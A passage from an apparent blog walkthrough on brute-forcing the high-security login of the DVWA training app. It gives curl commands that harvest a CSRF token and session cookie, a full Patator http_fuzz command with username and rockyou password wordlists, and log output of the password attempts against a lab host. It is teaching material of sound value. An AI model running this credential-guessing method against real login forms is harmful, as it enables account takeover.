&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 0% cpu 3.056 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.01s system 0% cpu 2.047 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 0% cpu 4.059 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 0% cpu 4.043 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 0% cpu 1.060 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 0% cpu 4.046 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 9% cpu 0.044 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 0% cpu 4.055 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Timing Issue" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-08.png" /&gt;&lt;/p&gt;

&lt;p&gt;There's a mixture of time delays, between 0-4 seconds. However, due to the "logged in CSRF token" mentioned before we are going to have to be using a single thread - so just make sure the time out value is greater than 4 seconds.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Patator"&gt;&lt;/a&gt;
&lt;h2&gt;Patator&lt;/h2&gt;

&lt;p&gt;Patator is able to request a certain URL before trying a combination attempt (using &lt;code&gt;before_urls&lt;/code&gt;), and can then extract a certain bit of information (&lt;code&gt;before_egrep&lt;/code&gt;) to include it in the attack (e.g. &lt;code&gt;_CSRF_&lt;/code&gt;). As already mentioned, having to be already authenticated to web application in order to brute force a form is slightly different. Lucky, Patator v0.7 can also send a header (&lt;code&gt;before_header&lt;/code&gt;) to make sure the requests are always as an authenticated user.
&lt;em&gt;Note, in the low and medium levels, we were using v0.5.&lt;/em&gt;&lt;/p&gt;

&lt;a name="Patator.Documentation"&gt;&lt;/a&gt;
&lt;h3&gt;Patator Documentation&lt;/h3&gt;

&lt;p&gt;Compared to the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;, the only extra arguments we are now using:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;before_urls   : comma-separated URLs to query before the main request
&lt;/span&gt;&lt;span class="line"&gt;before_header : use a custom header in the before_urls request
&lt;/span&gt;&lt;span class="line"&gt;before_egrep  : extract data from the before_urls response to place in the main request
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;--max-retries&lt;span class="o"&gt;=&lt;/span&gt;N     skip payload after N retries &lt;span class="o"&gt;(&lt;/span&gt;default is 4&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;-1 &lt;span class="k"&gt;for&lt;/span&gt; unlimited&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;before_urls&lt;/code&gt; - this will be the same URL as we are trying to brute force as it contains CSRF value we wish to acquire.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;before_header&lt;/code&gt; - this will be the same as the &lt;code&gt;header&lt;/code&gt; (because we need to be authenticated to being with).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;before_egrep&lt;/code&gt; - this is where the magic will happen. This extracts the CSRF token value from the page, so we can re-use it in the main request.

&lt;ul&gt;
&lt;li&gt;We know to use &lt;code&gt;&amp;lt;input type='hidden' name='user_token' value='...' /&amp;gt;&lt;/code&gt; due to the information we gathered using cURL.&lt;/li&gt;
&lt;li&gt;Patator uses regular expressions (&lt;code&gt;egrep&lt;/code&gt;) in order to locate the wanted CSRF value - &lt;code&gt;(\w+)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;We will assign the extracted value to the variable &lt;code&gt;_CSRF_&lt;/code&gt; so we can use it in the same matter as the wordlists - &lt;code&gt;&amp;amp;user_token=_CSRF_&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--max-retries&lt;/code&gt; - is not really required, just carried over from the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;medium level&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;If you would like to see what is happening behind the scenes, here is a &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-42.png"&gt;screenshot of the attack with a proxy being used&lt;/a&gt;.&lt;/p&gt;

&lt;a name="L.strong.Patator.Attack.Command..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Patator Attack Command&lt;/strong&gt;&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# python  patator.py  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=1  timeout=5 --max-retries=0 \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=_CSRF_&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=high; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;before_urls&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;before_header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=high; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;before_egrep&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_CSRF_:&amp;lt;input type='hidden' name='user_token' value='(\w+)' /&amp;gt;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Username and/or password incorrect'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;16:12:32 patator    INFO - Starting Patator v0.7-beta &lt;span class="o"&gt;(&lt;/span&gt;https://github.com/lanjelot/patator&lt;span class="o"&gt;)&lt;/span&gt; at 2015-11-06 16:12 GMT
&lt;/span&gt;&lt;span class="line"&gt;16:12:32 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;16:12:32 patator    INFO - code size:clen       &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; candidate                          &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;16:12:32 patator    INFO - -----------------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;16:12:32 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10639:5033     0.047 &lt;span class="p"&gt;|&lt;/span&gt; 123456:root                        &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:32 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.037 &lt;span class="p"&gt;|&lt;/span&gt; 123456:admin                       &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:34 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.051 &lt;span class="p"&gt;|&lt;/span&gt; 123456:test                        &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:35 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.050 &lt;span class="p"&gt;|&lt;/span&gt; 123456:guest                       &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:36 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.051 &lt;span class="p"&gt;|&lt;/span&gt; 123456:info                        &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:37 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.040 &lt;span class="p"&gt;|&lt;/span&gt; 123456:adm                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:37 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.039 &lt;span class="p"&gt;|&lt;/span&gt; 123456:mysql                       &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:40 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     3.049 &lt;span class="p"&gt;|&lt;/span&gt; 123456:user                        &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:44 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     4.034 &lt;span class="p"&gt;|&lt;/span&gt; 123456:administrator               &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:45 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.056 &lt;span class="p"&gt;|&lt;/span&gt; 123456:oracle                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:47 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     2.044 &lt;span class="p"&gt;|&lt;/span&gt; 123456:ftp                         &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:50 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     3.052 &lt;span class="p"&gt;|&lt;/span&gt; 12345:root                         &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:53 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     3.056 &lt;span class="p"&gt;|&lt;/span&gt; 12345:admin                        &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;13&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:54 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.043 &lt;span class="p"&gt;|&lt;/span&gt; 12345:test                         &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:55 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.049 &lt;span class="p"&gt;|&lt;/span&gt; 12345:guest                        &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:57 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     2.046 &lt;span class="p"&gt;|&lt;/span&gt; 12345:info                         &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:57 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.040 &lt;span class="p"&gt;|&lt;/span&gt; 12345:adm                          &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:58 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.040 &lt;span class="p"&gt;|&lt;/span&gt; 12345:mysql                        &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:12:59 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.046 &lt;span class="p"&gt;|&lt;/span&gt; 12345:user                         &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:00 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.072 &lt;span class="p"&gt;|&lt;/span&gt; 12345:administrator                &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:00 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.038 &lt;span class="p"&gt;|&lt;/span&gt; 12345:oracle                       &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;21&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:03 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     3.047 &lt;span class="p"&gt;|&lt;/span&gt; 12345:ftp                          &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:03 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.035 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:root                     &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:05 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     2.048 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:admin                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:05 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.035 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:test                     &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:08 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     2.051 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:guest                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:08 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.038 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:info                     &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;27&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:12 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     4.045 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:adm                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:14 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     2.052 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:mysql                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:16 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     2.043 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:user                     &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:16 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.028 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:administrator            &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:17 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.046 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:oracle                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;32&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:17 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     0.038 &lt;span class="p"&gt;|&lt;/span&gt; 123456789:ftp                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;33&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:18 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     1.069 &lt;span class="p"&gt;|&lt;/span&gt; password:root                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;34&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:18 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10614:5095     0.029 &lt;span class="p"&gt;|&lt;/span&gt; password:admin                     &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;35&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;16:13:22 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  10552:5033     4.035 &lt;span class="p"&gt;|&lt;/span&gt; password:test                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;36&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
